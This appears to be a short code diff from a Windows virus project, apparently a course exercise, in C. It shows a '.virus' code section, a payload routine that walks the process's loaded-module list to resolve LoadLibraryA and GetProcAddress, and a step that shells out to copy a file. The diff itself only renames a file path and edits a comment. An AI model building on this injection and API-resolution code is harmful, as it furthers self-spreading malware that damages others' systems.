@@ -9,6 +9,7 @@
 // #define KERNEL32_DLL 3
 // #define CURRENT_EXE 1
 
+#define NAME_OF_NEW_FILE "2021302181087"
 #define V_SECT_NAME ".virus"
 #define SET_SECT __attribute__((section(V_SECT_NAME)))
 
@@ -79,7 +80,7 @@ void payload(void)
     char s_puts[] = "puts";
     char s_printf[] = "printf";
 
-    // get_InMemoryOrderModuleList
+    // get_InMemoryOrderModuleList <a id="specific-line"></a>
     LIST_ENTRY *list = 0;
     {
         PEB *peb = 0; 
@@ -99,7 +100,6 @@ void payload(void)
     void *current_image_base = entry->DllBase;
 
     // load base funcs
-
     LOAD(LoadLibraryA);
     LOAD(GetProcAddress);
     LOAD(FreeLibrary);
@@ -200,7 +200,7 @@ task1: {
 
     char cpy_cmd[50];
     char cpy_fomat[] = "copy %s %s > NUL";
-    char dest_path[] = ".\\v_folder\\2021302181087.txt";
+    char dest_path[] = ".\\v_folder\\" NAME_OF_NEW_FILE ".txt";
     FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
     FUNCTION(system)(cpy_cmd);
 
